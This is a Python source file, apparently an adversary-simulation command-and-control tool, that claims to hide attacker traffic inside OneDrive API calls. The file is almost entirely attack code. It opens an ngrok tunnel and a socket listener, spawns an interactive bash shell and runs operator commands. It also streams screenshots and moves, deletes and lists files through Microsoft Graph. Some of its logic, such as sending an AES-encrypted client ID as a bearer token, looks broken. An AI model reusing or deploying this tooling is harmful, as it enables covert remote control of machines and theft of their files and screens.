# This script integrates OneDrive API functionality to facilitate communication between the compromised system and the attacker-controlled server, thereby potentially hiding the traffic within legitimate OneDrive communication.

# This C2 is for simulation only and is still under development
# pip install -r requirements.txt
# python3 OneDrive.py
# Author: S3N4T0R
# Date: 2024-4-9

# Disclaimer: it's essential to note that this script is for educational purposes only, and any unauthorized use of it could lead to legal consequences.

import subprocess
import sys
import time
import threading
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BLUE = '\033[94m'
RESET = '\033[0m'

print(BLUE + """

 ██████╗ ███╗   ██╗███████╗██████╗ ██████╗ ██╗██╗   ██╗███████╗     ██████╗██████╗ 
██╔═══██╗████╗  ██║██╔════╝██╔══██╗██╔══██╗██║██║   ██║██╔════╝    ██╔════╝╚════██╗
██║   ██║██╔██╗ ██║█████╗  ██║  ██║██████╔╝██║██║   ██║█████╗      ██║      █████╔╝
██║   ██║██║╚██╗██║██╔══╝  ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝      ██║     ██╔═══╝ 
╚██████╔╝██║ ╚████║███████╗██████╔╝██║  ██║██║ ╚████╔╝ ███████╗    ╚██████╗███████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝     ╚═════╝╚══════╝      
 
""" + RESET)

# Function to get attacker information
def get_attacker_info():
    attacker_ip = input("Enter the IP address for the reverse shell: ")
    return attacker_ip

# Function to encrypt access token
def encrypt_access_token(token):
    key = input("Enter your AES key (must be 16, 24, or 32 bytes long): ").encode()
    if len(key) not in [16, 24, 32]:
        print("Invalid key length. AES key must be 16, 24, or 32 bytes long.")
        sys.exit(1)
    cipher = AES.new(key, AES.MODE_ECB)
    token_padded = pad(token.encode(), AES.block_size)
    return base64.b64encode(cipher.encrypt(token_padded)).decode()

# Main function
def main():
    # Get attacker info
    access_token = input("Enter your OneDrive Application (client) ID: ")
    secret_id = input("Enter your OneDrive Secret ID: ")
    ip = get_attacker_info()

    port = input("Enter the port number for the reverse shell and ngrok: ")

    print("Starting ngrok tunnel...")
    # Update to use ngrok tcp command with the port specified by the attacker
    ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
    time.sleep(3)  # Give ngrok some time to establish the tunnel

    access_token_encrypted = encrypt_access_token(access_token)

    # Define headers for OneDrive API
    headers = {
        "Authorization": f"Bearer {access_token_encrypted}",
        "Content-Type": "application/json",
        "User-Agent": "OneDrive-API-Client/1.0",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Drive-Client-Secret": secret_id  # Add secret ID to headers
    }

    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))  # Bind to the port specified by the attacker
    s.listen(1)
    print("Waiting for incoming connection...")
    client_socket, addr = s.accept()

    # Start shell
    shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # Start display
    display = Display(visible=0, size=(800, 600))
    display.start()

    # Create sessions dictionary
    sessions = {}
    session_counter = 1

    # Main loop
    while True:
        command = input("Enter a command to execute (or type 'exit' to quit): ")
        if command.lower() == "exit":
            break
        
        time.sleep(random.uniform(1, 5))
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        stdout = result.stdout
        stderr = result.stderr
        
        client_socket.send(command.encode())
        client_socket.send(stdout.encode())
        client_socket.send(stderr.encode())

        if command.lower() == "screen":
            session_id = str(session_counter)
            session_counter += 1
            sessions[session_id] = {"socket": client_socket, "display": display}
            print(f"Started screen session {session_id}")

            screen = pyautogui.screenshot()
            screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

            client_socket.send(screen_data.encode())

            while True:
                try:
                    screen = pyautogui.screenshot()
                    screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                    client_socket.send(screen_data.encode())

                    time.sleep(0.1)
                except KeyboardInterrupt:
                    print("\nScreen session ended.")
                    break

        elif command.lower() == "upload":
            file_path = input("Enter the path of the file to upload: ")
            file_name = os.path.basename(file_path)
            with open(file_path, "rb") as f:
                file_data = f.read()
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_name + ":/content"
            response = requests.put(url, headers=headers, data=file_data)
            client_socket.send(response.text.encode())

        elif command.lower() == "download":
            file_path = input("Enter the path of the file to download: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_path
            response = requests.get(url, headers=headers)
            with open(os.path.basename(file_path), "wb") as f:
                f.write(response.content)
            client_socket.send("File downloaded successfully.".encode())

        elif command.lower() == "get":
            file_path = input("Enter the path of the file: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_path
            response = requests.get(url, headers=headers)
            client_socket.send(response.text.encode())

        elif command.lower() == "remove":
            file_path = input("Enter the path of the file to remove: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_path
            response = requests.delete(url, headers=headers)
            client_socket.send(response.text.encode())

        elif command.lower() == "add":
            folder_path = input("Enter the path of the folder to create: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + folder_path
            data = {"name": folder_path.split('/')[-1], "folder": {}}
            response = requests.post(url, headers=headers, json=data)
            client_socket.send(response.text.encode())

        elif command.lower() == "list_folder":
            folder_path = input("Enter the path of the folder to list: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + folder_path + ":/children"
            response = requests.get(url, headers=headers)
            client_socket.send(response.text.encode())

        else:
            client_socket.send(stdout.encode())
            client_socket.send(stderr.encode())

    # Close sockets and display
    client_socket.close()
    s.close()
    display.stop()

    # Terminate ngrok process
    ngrok_process.terminate()

if __name__ == "__main__":
    main()

